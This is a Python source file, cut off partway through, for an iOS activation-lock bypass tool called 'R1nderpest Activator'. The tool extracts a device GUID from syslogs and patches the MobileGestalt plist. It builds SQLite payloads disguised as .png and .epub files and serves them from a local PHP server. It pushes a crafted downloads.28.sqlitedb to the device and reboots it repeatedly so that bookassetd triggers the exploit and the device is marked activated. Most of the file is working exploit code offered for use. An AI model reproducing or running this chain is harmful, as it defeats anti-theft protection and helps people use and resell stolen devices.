import sys
import os
import time
import subprocess
import re
import shutil
import sqlite3
import atexit
import socket
import threading
import zipfile
import tempfile
import binascii
import plistlib
from http.server import SimpleHTTPRequestHandler
from socketserver import TCPServer

# --- CONFIGURATION & CONSTANTS ---

# (SQL Templates removed - using local files from other/bl_sbx/)

# --- CLASSES ---

class Style:
    RESET = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    RED = '\033[0;31m'
    GREEN = '\033[0;32m'
    YELLOW = '\033[1;33m'
    BLUE = '\033[0;34m'
    MAGENTA = '\033[0;35m'
    CYAN = '\033[0;36m'

class LocalServer:
    """
    Embedded HTTP server to serve the generated payloads to the device
    over the local network (Wi-Fi).
    """
    def __init__(self, port=8081):
        self.port = port
        self.serve_dir = tempfile.mkdtemp(prefix="ios_activation_")
        self.local_ip = self.get_local_ip()
        self.thread = None
        self.httpd = None

    def get_local_ip(self):
        """Attempts to find the LAN IP address."""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            # Connect to a public DNS server to determine outgoing interface IP
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"

    def get_all_ips(self):
        """Returns a list of all IP addresses on the host."""
        ips = []
        try:
            # Use hostname to get all IPs
            hostname = socket.gethostname()
            # This might return loopback or just one, so we try to be more thorough if possible
            # but standard python doesn't have a great cross-platform way without netifaces
            # We'll stick to the primary one + manual advice
            return [self.get_local_ip()]
        except:
            return []

    def start(self):
        """Starts the PHP server in a background process."""
        
        # Create a router.php to handle MIME types correctly
        router_code = """<?php
$path = parse_url($_SERVER["REQUEST_URI"], PHP_URL_PATH);
$file = __DIR__ . $path;

error_log("Request: " . $_SERVER["REQUEST_URI"]);

if (file_exists($file) && !is_dir($file)) {
    $ext = pathinfo($file, PATHINFO_EXTENSION);
    if (in_array($ext, ['png', 'sqlitedb', 'plist', 'epub'])) {
        header('Content-Type: application/octet-stream');
    }
    readfile($file);
    exit;
}
error_log("404 Not Found: " . $file);
return false;
?>"""
        with open(os.path.join(self.serve_dir, "router.php"), "w") as f:
            f.write(router_code)

        print(f"{Style.DIM}  ╰─▶ Starting PHP Server...{Style.RESET}")
        
        # Start PHP built-in server
        cmd = ["php", "-S", f"0.0.0.0:{self.port}", "-t", self.serve_dir, os.path.join(self.serve_dir, "router.php")]
        
        # Redirect output to a log file for debugging
        self.log_file = open("php_server.log", "w")
        self.process = subprocess.Popen(cmd, stdout=self.log_file, stderr=self.log_file)
        
        print(f"{Style.DIM}  ╰─▶ Local Server running at http://{self.local_ip}:{self.port} (Root: {self.serve_dir}){Style.RESET}")
        print(f"{Style.DIM}      (PHP logs are being written to 'php_server.log'){Style.RESET}")
        print(f"{Style.DIM}      (If the phone is on a different subnet, this IP might be wrong. Check your Wi-Fi settings.){Style.RESET}")

    def stop(self):
        if hasattr(self, 'process') and self.process:
            self.process.terminate()
        if hasattr(self, 'log_file') and self.log_file:
            self.log_file.close()
        if os.path.exists(self.serve_dir):
            shutil.rmtree(self.serve_dir)

    def get_file_url(self, filename):
        return f"http://{self.local_ip}:{self.port}/{filename}"

class PayloadGenerator:
    """
    Generates the specialized SQLite databases required for the bypass.
    Originally logic from the PHP backend, now ported to Python.
    """
    def __init__(self, server_root, asset_root):
        self.server_root = server_root
        self.asset_root = asset_root

    def _create_db_from_sql(self, sql_content, output_path):
        try:
            # Handle 'unistr' format (Oracle to SQLite conversion for python)
            # Regex: find unistr('...') or unistr("...") and convert \uXXXX to chars
            def unistr_sub(match):
                content = match.group(1)
                # Convert \XXXX to actual unicode characters (Python regex for hex is different)
                # The SQL dump has \0050 format (4 hex digits), so we look for that.
                # Note: In Python strings, backslash needs escaping.
                
                def hex_to_char(m):
                    try:
                        return binascii.unhexlify(m.group(1)).decode('utf-16-be')
                    except:
                        return m.group(0)

                decoded = re.sub(r'\\([0-9A-Fa-f]{4})', hex_to_char, content)
                return f"'{decoded}'"

            # Replace unistr('...')
            sql_content = re.sub(r"unistr\s*\(\s*['\"]([^'\"]*)['\"]\s*\)", unistr_sub, sql_content, flags=re.IGNORECASE)
            
            if os.path.exists(output_path): os.remove(output_path)
            
            conn = sqlite3.connect(output_path)
            cursor = conn.cursor()
            cursor.executescript(sql_content)
            conn.commit()
            conn.close()
            return True
        except Exception as e:
            print(f"{Style.RED}DB Gen Error: {e}{Style.RESET}")
            # Fallback: Try executing line by line if script fails
            try:
                conn = sqlite3.connect(output_path)
                cursor = conn.cursor()
                for statement in sql_content.split(';'):
                    if statement.strip():
                        try: cursor.execute(statement)
                        except: pass
                conn.commit()
                conn.close()
                return True
            except:
                return False

    def generate(self, prd, guid, sn, local_server):
        # Normalize Product ID
        prd_safe = prd.replace(',', '-')
        
        # 1. Locate MobileGestalt
        plist_path = os.path.join(self.asset_root, "assets", "Maker", prd_safe, "com.apple.MobileGestalt.plist")
        if not os.path.exists(plist_path):
            print(f"{Style.RED}[✗] Asset missing: {plist_path}{Style.RESET}")
            return None

        # Generate random token for obfuscation
        token1 = binascii.hexlify(os.urandom(8)).decode()

        # 1.5. PATCH THE PLIST
        temp_plist = os.path.join(self.server_root, f"temp_gestalt_{token1}.plist")
        shutil.copy(plist_path, temp_plist)

        # Try using the compiled gestalt_hax_v2 patcher first
        patcher_bin = os.path.join(self.asset_root, "other", "gestalt_hax_v2", "patcher")
        patched_via_bin = False
        
        if os.path.exists(patcher_bin):
            print(f"{Style.CYAN}[*]{Style.RESET} Using native gestalt_hax_v2 patcher...")
            try:
                # The patcher takes the plist path as an argument
                res = subprocess.run([patcher_bin, temp_plist], capture_output=True, text=True)
                if res.returncode == 0 and "Patching done" in res.stdout:
                    print(f"{Style.GREEN}[✓]{Style.RESET} Native patcher success")
                    print(f"{Style.DIM}{res.stdout.strip()}{Style.RESET}")
                    patched_via_bin = True
                else:
                    print(f"{Style.YELLOW}[⚠] Native patcher failed/warning: {res.stdout} {res.stderr}{Style.RESET}")
            except Exception as e:
                print(f"{Style.RED}[✗] Native patcher execution error: {e}{Style.RESET}")

        # Fallback to Python patcher if binary failed
        if not patched_via_bin:
            print(f"{Style.YELLOW}[*]{Style.RESET} Falling back to Python patcher...")
            patcher = MobileGestaltPatcher(temp_plist)
            if not patcher.patch_for_activation():
                print(f"{Style.RED}[✗] Failed to patch MobileGestalt{Style.RESET}")
                return None

        # Use the patched plist
        plist_path = temp_plist

        # 2. Create 'fixedfile' (Zipped Plist)
        # The device expects a ZIP (EPUB-like) structure.
        zip_name = f"payload_{token1}.epub" # Use .epub extension
        zip_path = os.path.join(self.server_root, zip_name)
        
        with zipfile.ZipFile(zip_path, 'w') as zf:
            # Add mimetype file first, uncompressed (Required for valid EPUB)
            mimetype_path = os.path.join(self.server_root, "mimetype")
            with open(mimetype_path, "w") as f:
                f.write("application/epub+zip")
            zf.write(mimetype_path, "mimetype", compress_type=zipfile.ZIP_STORED)
            os.remove(mimetype_path)
            
            # Add the plist
            zf.write(plist_path, "Caches/com.apple.MobileGestalt.plist", compress_type=zipfile.ZIP_DEFLATED)
        
        fixedfile_name = zip_name
        fixedfile_url = local_server.get_file_url(fixedfile_name)

        # --- 3. Prepare BLDatabaseManager.sqlite ---
        # Use SQL template from server/templates
        bl_sql_path = os.path.join(self.asset_root, "server", "templates", "bl_structure.sql")
        
        if not os.path.exists(bl_sql_path):
            print(f"{Style.RED}[✗] BL SQL template missing: {bl_sql_path}{Style.RESET}")
            return None
            
        token2 = binascii.hexlify(os.urandom(8)).decode()
        bl_db_name = f"belliloveu_{token2}.png"
        bl_db_path = os.path.join(self.server_root, bl_db_name)
        
        try:
            with open(bl_sql_path, 'r') as f:
                bl_sql_content = f.read()
            
            # Replace placeholder with URL
            bl_sql_content = bl_sql_content.replace('KEYOOOOOO', fixedfile_url)
            
            print(f"{Style.DIM}  ╰─▶ Generating BLDatabaseManager from SQL...{Style.RESET}")
            if not self._create_db_from_sql(bl_sql_content, bl_db_path):
                print(f"{Style.RED}[✗] Failed to create BLDatabaseManager from SQL{Style.RESET}")
                return None
                
        except Exception as e:
            print(f"{Style.RED}[✗] Failed to prepare BLDatabaseManager: {e}{Style.RESET}")
            return None
        
        bl_url = local_server.get_file_url(bl_db_name)

        # Create dummy WAL/SHM for BL DB (empty files)
        wal_name = f"belliloveu_{token2}_wal.png"
        shm_name = f"belliloveu_{token2}_shm.png"
        with open(os.path.join(self.server_root, wal_name), 'wb') as f: pass
        with open(os.path.join(self.server_root, shm_name), 'wb') as f: pass
        
        wal_url = local_server.get_file_url(wal_name)
        shm_url = local_server.get_file_url(shm_name)

        # Create dummy iTunesMetadata.plist (Valid empty plist)
        meta_name = f"metadata_{token2}.plist"
        # Create a more complete dummy plist to mimic real structure if needed, 
        # but empty dict is usually fine. Let's add some basic keys just in case.
        dummy_plist = {
            "artistName": "Apple Inc.",
            "playlistName": "Purchased",
            "itemName": "iBooks",
            "itemId": 123456789
        }
        with open(os.path.join(self.server_root, meta_name), 'wb') as f:
            plistlib.dump(dummy_plist, f) 
        
        meta_url = local_server.get_file_url(meta_name)

        # --- 4. Prepare downloads.28.sqlitedb ---
        # Use SQL template from server/templates
        dl_sql_path = os.path.join(self.asset_root, "server", "templates", "downloads_structure.sql")

        if not os.path.exists(dl_sql_path):
            print(f"{Style.RED}[✗] Downloads SQL template missing: {dl_sql_path}{Style.RESET}")
            return None

        token3 = binascii.hexlify(os.urandom(8)).decode()
        final_db_name = f"downloads_{token3}.sqlitedb"
        final_db_path = os.path.join(self.server_root, final_db_name)
        
        try:
            with open(dl_sql_path, 'r') as f:
                dl_sql_content = f.read()
            
            # Replace placeholders in SQL (new format from working hanakim3945 DB)
            # The template has URLs like: https://your_domain_here/fileprovider.php?type=sqlite
            server_base = f"http://{local_server.local_ip}:{local_server.port}"
            
            # Replace URL placeholders with our server URLs
            dl_sql_content = dl_sql_content.replace('https://your_domain_here/fileprovider.php?type=sqlite', bl_url)
            dl_sql_content = dl_sql_content.replace('https://your_domain_here/fileprovider.php?type=blshm', shm_url)
            dl_sql_content = dl_sql_content.replace('https://your_domain_here/fileprovider.php?type=blwal', wal_url)
            dl_sql_content = dl_sql_content.replace('https://your_domain_here/fileprovider.php?type=itunes', meta_url)
            
            # Legacy fallbacks (keep for compatibility)
            dl_sql_content = dl_sql_content.replace('URL_METADATA', meta_url)
            dl_sql_content = dl_sql_content.replace('URL_WAL', wal_url)
            dl_sql_content = dl_sql_content.replace('URL_SHM', shm_url)
            dl_sql_content = dl_sql_content.replace('URL_DB', bl_url)
            dl_sql_content = dl_sql_content.replace('https://google.com', bl_url)
            dl_sql_content = dl_sql_content.replace('GOODKEY', guid)
            
            print(f"{Style.DIM}  ╰─▶ Generating downloads.28.sqlitedb from SQL...{Style.RESET}")
            if not self._create_db_from_sql(dl_sql_content, final_db_path):
                print(f"{Style.RED}[✗] Failed to create downloads DB from SQL{Style.RESET}")
                return None

        except Exception as e:
            print(f"{Style.RED}[✗] Failed to generate downloads DB: {e}{Style.RESET}")
            return None
        
        return final_db_path

class BypassAutomation:
    def __init__(self):
        self.timeouts = {'asset_wait': 300, 'asset_delete_delay': 15, 'reboot_wait': 300, 'syslog_collect': 180}
        self.mount_point = os.path.join(os.path.expanduser("~"), f".ifuse_mount_{os.getpid()}")
        self.afc_mode = None
        self.device_info = {}
        self.guid = None
        
        # Server Components
        self.server = LocalServer()
        self.generator = PayloadGenerator(self.server.serve_dir, os.getcwd()) # Assets relative to CWD

        atexit.register(self._cleanup)

    def log(self, msg, level='info'):
        if level == 'info': print(f"{Style.GREEN}[✓]{Style.RESET} {msg}")
        elif level == 'error': print(f"{Style.RED}[✗]{Style.RESET} {msg}")
        elif level == 'warn': print(f"{Style.YELLOW}[⚠]{Style.RESET} {msg}")
        elif level == 'step':
            print(f"\n{Style.BOLD}{Style.CYAN}" + "━" * 40 + f"{Style.RESET}")
            print(f"{Style.BOLD}{Style.BLUE}▶{Style.RESET} {Style.BOLD}{msg}{Style.RESET}")
            print(f"{Style.CYAN}" + "━" * 40 + f"{Style.RESET}")
        elif level == 'detail': print(f"{Style.DIM}  ╰─▶{Style.RESET} {msg}")
        elif level == 'success': print(f"{Style.GREEN}{Style.BOLD}[✓ SUCCESS]{Style.RESET} {msg}")

    def _run_cmd(self, cmd, timeout=None):
        try:
            res = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
            return res.returncode, res.stdout.strip(), res.stderr.strip()
        except subprocess.TimeoutExpired as e:
            return 124, (e.stdout or "").strip(), (e.stderr or "").strip()
        except Exception as e: return 1, "", str(e)

    def verify_dependencies(self):
        self.log("Verifying System Requirements...", "step")
        # Check for assets/Maker
        if not os.path.isdir(os.path.join(os.getcwd(), "assets", "Maker")):
            self.log("Missing 'assets/Maker' folder in current directory.", "error")
            sys.exit(1)

        # Check for pymobiledevice3
        if not shutil.which("pymobiledevice3"):
            self.log("pymobiledevice3 not found in PATH. Please install it (pip3 install pymobiledevice3).", "error")
            # If running with sudo, suggest -E or full path
            if os.geteuid() == 0:
                self.log("If you installed it as a user, try running with 'sudo -E python3 ...' or install it globally.", "warn")
            sys.exit(1)

        if shutil.which("ifuse"): self.afc_mode = "ifuse"
        else: self.afc_mode = "pymobiledevice3"
        self.log(f"AFC Transfer Mode: {self.afc_mode}", "info")

    def mount_afc(self):
        if self.afc_mode != "ifuse": return True
        os.makedirs(self.mount_point, exist_ok=True)
        code, out, _ = self._run_cmd(["mount"])
        if self.mount_point in out: return True
        for i in range(5):
            if self._run_cmd(["ifuse", self.mount_point])[0] == 0: return True
            time.sleep(2)
        return False

    def unmount_afc(self):
        if self.afc_mode == "ifuse" and os.path.exists(self.mount_point):
            self._run_cmd(["umount", self.mount_point])
            try: os.rmdir(self.mount_point)
            except: pass

    def detect_device(self):
        self.log("Detecting Device...", "step")
        code, out, _ = self._run_cmd(["ideviceinfo"])
        if code != 0: 
            self.log("No device found via USB", "error")
            sys.exit(1)
        
        info = {}
        for line in out.splitlines():
            if ": " in line:
                key, val = line.split(": ", 1)
                info[key.strip()] = val.strip()
        self.device_info = info
        
        print(f"\n{Style.BOLD}Device: {info.get('ProductType','Unknown')} (iOS {info.get('ProductVersion','?')}){Style.RESET}")
        print(f"UDID: {info.get('UniqueDeviceID','?')}")
        
        if info.get('ActivationState') == 'Activated':
            print(f"{Style.YELLOW}Warning: Device already activated.{Style.RESET}")

    def cleanup_media_folders(self):
        """
        Cleans Downloads, Books, and iTunes_Control folders to ensure a clean state.
        This mimics the 'Proper' cleanup method from A12Bypass.py.
        """
        self.log("Cleaning device folders (Downloads, Books, iTunes_Control)...", "info")
        
        # Known paths to clean
        folders = ["Downloads", "Books", "iTunes_Control/iTunes"]
        
        # Specific files to target (including potential leftovers)
        targets = [
            "Downloads/downloads.28.sqlitedb",
            "Downloads/downloads.28.sqlitedb-wal",
            "Downloads/downloads.28.sqlitedb-shm",
            "Downloads/record.sqlitedb",
            "Books/asset.epub",
            "iTunes_Control/iTunes/iTunesMetadata.plist"
        ]

        if self.afc_mode == "ifuse":
            self.mount_afc()
            # Clean specific targets
            for t in targets:
                path = os.path.join(self.mount_point, t)
                if os.path.exists(path):
                    try:
                        os.remove(path)
                        self.log(f"Deleted {t}", "detail")
                    except Exception as e:
                        self.log(f"Failed to delete {t}: {e}", "detail")
            
            # Try to clean folders (non-recursive for safety, just files)
            for folder in folders:
                full_path = os.path.join(self.mount_point, folder)
                if os.path.exists(full_path):
                    for f in os.listdir(full_path):
                        file_path = os.path.join(full_path, f)
                        if os.path.isfile(file_path):
                            try:
                                os.remove(file_path)
                            except: pass
        else:
            # pymobiledevice3 mode
            # 1. Remove specific targets
            for t in targets:
                self._run_cmd(["pymobiledevice3", "afc", "rm", t])
            
            # 2. List and remove files in target folders
            for folder in folders:
                code, out, _ = self._run_cmd(["pymobiledevice3", "afc", "ls", folder])
                if code == 0:
                    for line in out.splitlines():
                        fname = line.strip()
                        if fname not in ['.', '..', '']:
                            self._run_cmd(["pymobiledevice3", "afc", "rm", f"{folder}/{fname}"])

        self.log("Device folders cleaned.", "success")

    def check_wifi_sync(self):
        # Removed as per user request
        pass

    def get_guid(self):
        self.log("Extracting GUID...", "step")
        
        # Regex to find the GUID in the path
        patterns = [
            r'([A-F0-9]{8}-[A-F0-9]{4}-[A-F0-9]{4}-[A-F0-9]{4}-[A-F0-9]{12})/Documents/BLDatabaseManager',
            r'([A-F0-9]{8}-[A-F0-9]{4}-[A-F0-9]{4}-[A-F0-9]{4}-[A-F0-9]{12})/Documents/BLDatabase',
            r'SystemGroup/([0-9A-Fa-f]{8}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{12})/'
        ]

        # --- Method: Slow Archive (Reliable) ---
        self.log("Collecting system logs (this takes a few minutes)...", "info")
        udid = self.device_info['UniqueDeviceID']
        log_path = f"{udid}.logarchive"
        if os.path.exists(log_path): shutil.rmtree(log_path)
        
        # Collect logs
        self._run_cmd(["pymobiledevice3", "syslog", "collect", log_path], timeout=180)
        
        if os.path.exists(log_path):
            tmp = "final.logarchive"
            if os.path.exists(tmp): shutil.rmtree(tmp)
            shutil.move(log_path, tmp)
            
            self.log("Parsing logs...", "detail")
            # Broad search: Get everything containing "SystemGroup" or "BLDatabase"
            # We avoid strict process filtering to be more robust
            _, logs, _ = self._run_cmd([
                "/usr/bin/log", "show", 
                "--style", "syslog", 
                "--archive", tmp, 
                "--predicate", 
                'eventMessage CONTAINS "SystemGroup" OR eventMessage CONTAINS "BLDatabase"'
            ])

            shutil.rmtree(tmp)
            
            for line in logs.splitlines():
                for pattern in patterns:
                    match = re.search(pattern, line, re.IGNORECASE)
                    if match: 
                        found = match.group(1).upper()
                        self.log(f"Found GUID: {found}", "success")
                        return found
            
            # Fallback: Try Books method if logs failed
            self.log("Log method failed. Trying Books method...", "warn")
            try:
                self._run_cmd(["pymobiledevice3", "processes", "launch", "com.apple.iBooks"])
                time.sleep(5)
            except:
                pass

        self.log("Could not find GUID in logs.", "error")
        return None

    def transfer_plist_to_books(self):
        """
        Copies iTunesMetadata.plist from iTunes_Control to Books.
        This mimics the behavior of the Strawhat fork.
        """
        self.log("Transferring iTunesMetadata.plist to Books...", "step")
        
        src = "/iTunes_Control/iTunes/iTunesMetadata.plist"
        dst = "/Books/iTunesMetadata.plist" # Renaming to match source filename, Strawhat does this.
        
        # Check if source exists
        if self.afc_mode == "ifuse":
            src_path = os.path.join(self.mount_point, src.lstrip("/"))
            dst_path = os.path.join(self.mount_point, dst.lstrip("/"))
            
            if os.path.exists(src_path):
                try:
                    shutil.copy(src_path, dst_path)
                    self.log("Copied plist to Books (ifuse).", "success")
                    return True
                except Exception as e:
                    self.log(f"Failed to copy plist: {e}", "error")
                    return False
            else:
                self.log("Source plist not found in iTunes_Control.", "warn")
                return False
        else:
            # pymobiledevice3
            # We need to download then upload
            local_temp = "temp_metadata.plist"
            
            # Check existence (ls)
            code, out, _ = self._run_cmd(["pymobiledevice3", "afc", "ls", "/iTunes_Control/iTunes"])
            if "iTunesMetadata.plist" not in out:
                self.log("Source plist not found in iTunes_Control.", "warn")
                return False
                
            # Pull
            self._run_cmd(["pymobiledevice3", "afc", "pull", src, local_temp])
            
            if os.path.exists(local_temp):
                # Push
                self._run_cmd(["pymobiledevice3", "afc", "push", local_temp, dst])
                os.remove(local_temp)
                self.log("Copied plist to Books (pymobiledevice3).", "success")
                return True
            else:
                self.log("Failed to pull plist from device.", "error")
                return False

    def monitor_server_log(self):
        """
        Reads the PHP server log file and prints new lines to the console.
        This helps verify if the device is actually requesting the files.
        """
        log_path = "php_server.log"
        if not os.path.exists(log_path): return

        with open(log_path, "r") as f:
            # Go to the end of the file
            f.seek(0, 2)
            
            while True:
                line = f.readline()
                if line:
                    print(f"{Style.DIM}      [SERVER LOG] {line.strip()}{Style.RESET}")
                else:
                    time.sleep(0.5)
                
                if not hasattr(self, 'server') or not self.server.process:
                    break

    def run(self):
        os.system('clear')
        print(f"{Style.BOLD}{Style.MAGENTA}R1nderpest Activator{Style.RESET}\n")
        
        self.verify_dependencies()
        self.server.start() # Start HTTP server
        self.detect_device()
        # self.check_wifi_sync() # Removed
        
        print(f"{Style.YELLOW}Starting in 5 seconds...{Style.RESET}")
        time.sleep(5)
        
        # --- Extract GUID from device ---
        self.guid = self.get_guid()

        if not self.guid:
            self.log("Could not find GUID in logs.", "error")
            sys.exit(1)
        
        # 3. Generate Payloads (Offline Logic)
        self.log("Generating Payload...", "step")
        final_db_path = self.generator.generate(
            self.device_info['ProductType'], 
            self.guid, 
            self.device_info['SerialNumber'],
            self.server
        )
        
        if not final_db_path:
            self.log("Payload generation failed.", "error")
            sys.exit(1)
        self.log("Payload Generated.", "success")

        # DEBUG: List generated files
        print(f"{Style.DIM}  [DEBUG] Generated files in server root:{Style.RESET}")
        for f in os.listdir(self.server.serve_dir):
            print(f"{Style.DIM}    - {f}{Style.RESET}")

        # 4. Upload
        self.log("Uploading...", "step")
        target_base = "/Downloads/downloads.28.sqlitedb"
        
        # Cleanup old files (Important: remove WAL/SHM to prevent SQLite corruption)
        files_to_remove = [target_base, target_base + "-shm", target_base + "-wal"]
        
        if self.afc_mode == "ifuse":
            self.mount_afc()
            for f in files_to_remove:
                fpath = self.mount_point + f
                if os.path.exists(fpath): os.remove(fpath)
            
            # Copy new file
            shutil.copy(final_db_path, self.mount_point + target_base)
        else:
            for f in files_to_remove:
                self._run_cmd(["pymobiledevice3", "afc", "rm", f])
            
            self._run_cmd(["pymobiledevice3", "afc", "push", final_db_path, target_base])
            
        self.log("Payload Deployed.", "success")
        
        # Start Server Log Monitor
        threading.Thread(target=self.monitor_server_log, daemon=True).start()
        
        # 5. Execution Sequence
        print(f"Server IP: {self.server.local_ip}")
        
        # Wait 30 seconds before first reboot (as per A12Bypass.py recommendation)
        self.log("Waiting 30 seconds before first reboot to ensure filesystem sync...", "info")
        time.sleep(30)

        self.log("Rebooting (Stage 1/2)...", "step")
        self._run_cmd(["pymobiledevice3", "diagnostics", "restart"])
        
        time.sleep(10)
        
        # Wait for device to be detected again
        self.log("Waiting for reconnection...", "detail")
        start_wait = time.time()
        while time.time() - start_wait < 120:
            if self._run_cmd(["ideviceinfo"])[0] == 0: break
            time.sleep(2)
        self.log("Device reconnected.", "success")

        # --- ADDED: 60s Wait (Strawhat Logic) ---
        self.log("Waiting 60 seconds for system stabilization (Strawhat Logic)...", "info")
        time.sleep(60)

        # --- Prompt user to open Books app manually ---
        print(f"\n{Style.BOLD}{Style.YELLOW}*** MANUAL ACTION REQUIRED ***{Style.RESET}")
        print(f"{Style.YELLOW}Please open the Books app on your device NOW!{Style.RESET}")
        print(f"{Style.YELLOW}Then press Enter to continue...{Style.RESET}")
        input()
        time.sleep(5)

        # --- ADDED: Plist Transfer (Strawhat Logic) ---
        self.transfer_plist_to_books()

        # --- 6. Reboot Sequence (Matching A12 2.sh) ---
        
        # Reboot 1 (Already done above as "Stage 1/2" in previous code, but let's align with bash script)
        # The bash script does:
        # 1. Upload DB
        # 2. Reboot (First Reboot)
        # 3. Wait for iTunesMetadata.plist
        # 4. Reboot (Second Reboot)
        # 5. Wait for asset.epub
        # 6. Wait for iTunesMetadata.plist to disappear
        # 7. Cleanup
        # 8. Reboot (Final Reboot)
        
        # We just finished Reboot 1 (Stage 1/2 in old code).
        # Now we verify iTunesMetadata.plist
        
        self.log("Verifying iTunesMetadata.plist...", "step")
        metadata_path = "/iTunes_Control/iTunes/iTunesMetadata.plist"
        found_metadata = False
        
        # Wait up to 20s
        for i in range(20):
            code, out, _ = self._run_cmd(["pymobiledevice3", "afc", "ls", "/iTunes_Control/iTunes"])
            if "iTunesMetadata.plist" in out:
                self.log("iTunesMetadata.plist found.", "success")
                found_metadata = True
                break
            time.sleep(1)
            
        if not found_metadata:
            self.log("iTunesMetadata.plist not found (continuing anyway...)", "warn")

        # Reboot 2
        self.log("Rebooting (Stage 2/3)...", "step")
        self._run_cmd(["pymobiledevice3", "diagnostics", "restart"])
        
        time.sleep(10) # Short wait before polling
        
        # Wait for reconnection
        self.log("Waiting for reconnection...", "detail")
        start_wait = time.time()
        while time.time() - start_wait < 120:
            code, _, _ = self._run_cmd(["ideviceinfo", "-k", "UniqueDeviceID"])
            if code == 0: break
            time.sleep(2)
        self.log("Device reconnected.", "success")

        # --- ADDED: Wait for bookassetd to process BLDatabaseManager ---
        self.log("Waiting 60 seconds for bookassetd to process BLDatabaseManager...", "info")
        
        # Launch iBooks to trigger bookassetd to read BLDatabaseManager
        self.log("Launching iBooks to trigger bookassetd...", "info")
        try:
            self._run_cmd(["pymobiledevice3", "apps", "launch", "com.apple.iBooks"])
        except:
            try:
                self._run_cmd(["pymobiledevice3", "processes", "launch", "com.apple.iBooks"])
            except:
                self.log("Could not launch iBooks automatically", "warn")
        
        for sec in range(60):
            time.sleep(1)
            # Check server log periodically for epub request
            if sec % 10 == 0:
                try:
                    with open("php_server.log", "r") as f:
                        content = f.read()
                        if "payload_" in content and ".epub" in content:
                            self.log("Server received epub request!", "success")
                            break
                except:
                    pass

        # Monitor asset.epub (Exploit Trigger)
        self.log("Waiting for asset.epub (Exploit Trigger)...", "step")
        found_asset = False
        
        # Wait up to 300s
        for i in range(60): # Check every 5s for 300s
            # Check /Books/asset.epub
            code, out, _ = self._run_cmd(["pymobiledevice3", "afc", "ls", "/Books"])
            if "asset.epub" in out or "asset" in out: # Loose match as per bash script
                 self.log("asset.epub detected!", "success")
                 found_asset = True
                 break
            
            # Debug: Show what IS there
            if i % 4 == 0: # Every 20s
                # Check /Books
                code, out, _ = self._run_cmd(["pymobiledevice3", "afc", "ls", "/Books"])
                files = [f for f in out.splitlines() if f not in ['.', '..', '']]
                print(f"\n{Style.DIM}      [DEBUG] /Books: {files}{Style.RESET}")

                # Check /Downloads (To see if temp files are stuck there)
                code_dl, out_dl, _ = self._run_cmd(["pymobiledevice3", "afc", "ls", "/Downloads"])
                files_dl = [f for f in out_dl.splitlines() if f not in ['.', '..', '']]
                if files_dl:
                    print(f"{Style.DIM}      [DEBUG] /Downloads: {files_dl}{Style.RESET}")
                
                # Check if server is still alive
                if self.server.process.poll() is not None:
                    print(f"\n{Style.RED}[!] PHP Server has crashed! Exit code: {self.server.process.returncode}{Style.RESET}")
                    print(f"{Style.RED}[!] Check php_server.log for details.{Style.RESET}")
                    # Attempt restart?
                    print(f"{Style.YELLOW}[*] Attempting to restart server...{Style.RESET}")
                    self.server.start()
                
                # Check if iTunesMetadata.plist is still there
                code_meta, out_meta, _ = self._run_cmd(["pymobiledevice3", "afc", "ls", "/iTunes_Control/iTunes"])
                if "iTunesMetadata.plist" not in out_meta:
                     print(f"{Style.YELLOW}      [DEBUG] iTunesMetadata.plist MISSING from /iTunes_Control/iTunes!{Style.RESET}")
                else:
                     print(f"{Style.DIM}      [DEBUG] iTunesMetadata.plist present in /iTunes_Control/iTunes{Style.RESET}")

            time.sleep(5)
            print(f"{Style.DIM}.", end="", flush=True)
        print()
        
        if found_asset:
            # Wait for iTunesMetadata.plist to disappear
            self.log("Waiting for iTunesMetadata.plist to disappear...", "detail")
            for i in range(60):
                code, out, _ = self._run_cmd(["pymobiledevice3", "afc", "ls", "/iTunes_Control/iTunes"])
                if "iTunesMetadata.plist" not in out:
                    self.log("iTunesMetadata.plist disappeared.", "success")
                    break
                time.sleep(5)
                print(f"{Style.DIM}.", end="", flush=True)
            print()
            
            # Cleanup asset.epub
            self.log("Deleting asset.epub...", "detail")
            self._run_cmd(["pymobiledevice3", "afc", "rm", "/Books/asset.epub"])
            
        else:
            self.log("asset.epub NOT detected. Exploit might have failed.", "warn")
            self.log("Attempting recovery path...", "warn")

        # Cleanup Downloads
        self.log("Cleaning up Downloads...", "detail")
        self._run_cmd(["pymobiledevice3", "afc", "rm", "/Downloads/downloads.28.sqlitedb"])
        self._run_cmd(["pymobiledevice3", "afc", "rm", "/Downloads/downloads.28.sqlitedb-shm"])
        self._run_cmd(["pymobiledevice3", "afc", "rm", "/Downloads/downloads.28.sqlitedb-wal"])

        # Reboot 3 (Final)
        self.log("Rebooting (Stage 3/3 - Final)...", "step")
        self._run_cmd(["pymobiledevice3", "diagnostics", "restart"])
        
        time.sleep(10)
        
        # Wait for reconnection
        self.log("Waiting for reconnection...", "detail")
        start_wait = time.time()
        while time.time() - start_wait < 120:
            code, _, _ = self._run_cmd(["ideviceinfo", "-k", "UniqueDeviceID"])
            if code == 0: break
            time.sleep(2)
        self.log("Device reconnected.", "success")

        # Check Activation State with Retry
        self.log("Checking Activation State (Smart Retry)...", "step")
        
        max_retries = 3
        for attempt in range(max_retries):
            self.log(f"Activation Check Attempt {attempt+1}/{max_retries}", "info")
            
            # Check loop (try for 60s)
            for i in range(12):
                code, out, _ = self._run_cmd(["ideviceinfo", "-k", "ActivationState"])
                state = out.strip()
                print(f"  [{i+1}/12] State: {state}")
                
                if "Activated" in state:
                    print(f"\n{Style.BOLD}{Style.GREEN}🎉 DEVICE ACTIVATED SUCCESSFULLY! 🎉{Style.RESET}")
                    self._cleanup()
                    return
                time.sleep(5)
            
            if attempt < max_retries - 1:
                self.log("Device not activated yet. Rebooting and retrying...", "warn")
                self._run_cmd(["pymobiledevice3", "diagnostics", "restart"])
                
                # Wait for reconnect
                time.sleep(10)
                start_wait = time.time()
                while time.time() - start_wait < 120:
                    if self._run_cmd(["ideviceinfo", "-k", "UniqueDeviceID"])[0] == 0: break
                    time.sleep(2)
                
                self.log("Device reconnected. Waiting 45s...", "info")
                time.sleep(45)

        self.log("Activation failed after all retries.", "error")
        
        self._cleanup()

    def _cleanup(self): 
        self.unmount_afc()
        self.server.stop()

class MobileGestaltPatcher:
    """
